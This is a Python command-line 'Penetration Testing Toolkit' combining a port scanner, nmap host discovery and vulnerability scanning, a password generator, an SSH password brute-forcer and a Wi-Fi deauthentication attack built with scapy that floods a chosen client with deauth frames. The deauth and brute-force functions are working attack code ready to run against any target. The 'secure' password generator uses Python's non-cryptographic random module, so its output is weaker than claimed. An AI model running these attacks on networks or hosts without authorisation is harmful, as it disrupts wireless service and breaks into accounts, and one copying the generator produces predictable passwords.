import argparse
import socket
import nmap
import scapy.all as scapy
import hashlib
import random
import string
import paramiko
from scapy.layers.dot11 import RadioTap, Dot11, Dot11Deauth

# Port Scanner
def port_scanner(target, ports):
    print(f"Scanning {target}...")
    for port in ports:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        socket.setdefaulttimeout(1)
        result = s.connect_ex((target, port))
        if result == 0:
            print(f"[+] Port {port} is open")
        s.close()

# Brute-Forcer (Example for SSH, requires paramiko)
def brute_force_ssh(target, username, password_list):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    for password in password_list:
        try:
            ssh.connect(target, username=username, password=password, timeout=1)
            print(f"[+] Password found: {password}")
            return password
        except:
            continue

# Password Generator
def generate_password(length=12):
    chars = string.ascii_letters + string.digits + string.punctuation
    return ''.join(random.choice(chars) for _ in range(length))

# Network Mapper
def network_mapper(target):
    nm = nmap.PortScanner()
    nm.scan(hosts=target, arguments='-sn')
    for host in nm.all_hosts():
        print(f"Host: {host} ({nm[host].hostname()})")

# Wi-Fi Deauthentication Attack (Requires monitor mode enabled)
def deauth_attack(target_mac, ap_mac, iface):
    pkt = RadioTap()/Dot11(addr1=target_mac, addr2=ap_mac, addr3=ap_mac)/Dot11Deauth(reason=7)
    scapy.sendp(pkt, iface=iface, count=100, inter=0.1, verbose=True)

# Remote Vulnerability Scanner
def vulnerability_scan(target):
    nm = nmap.PortScanner()
    nm.scan(hosts=target, arguments='-sV --script vuln')
    for host in nm.all_hosts():
        print(f"Vulnerabilities for {host}:")
        print(nm[host])

# CLI Interactive Menu
def main():
    while True:
        print("\nPenetration Testing Toolkit")
        print("1. Scan open ports")
        print("2. Map network devices")
        print("3. Generate secure password")
        print("4. Perform remote vulnerability scan")
        print("5. Perform Wi-Fi deauth attack")
        print("6. Exit")
        
        choice = input("Select an option: ")
        
        if choice == "1":
            target = input("Enter target IP: ")
            ports = [21, 22, 23, 25, 80, 443, 8080]  # Common ports
            port_scanner(target, ports)
        elif choice == "2":
            target = input("Enter network IP range (e.g., 192.168.1.0/24): ")
            network_mapper(target)
        elif choice == "3":
            length = int(input("Enter password length: "))
            print(f"Generated Password: {generate_password(length)}")
        elif choice == "4":
            target = input("Enter target IP: ")
            vulnerability_scan(target)
        elif choice == "5":
            target_mac = input("Enter target MAC address: ")
            ap_mac = input("Enter AP MAC address: ")
            iface = input("Enter network interface (e.g., wlan0mon): ")
            deauth_attack(target_mac, ap_mac, iface)
        elif choice == "6":
            print("Exiting...")
            break
        else:
            print("Invalid choice. Please select a valid option.")

if __name__ == "__main__":
    main()
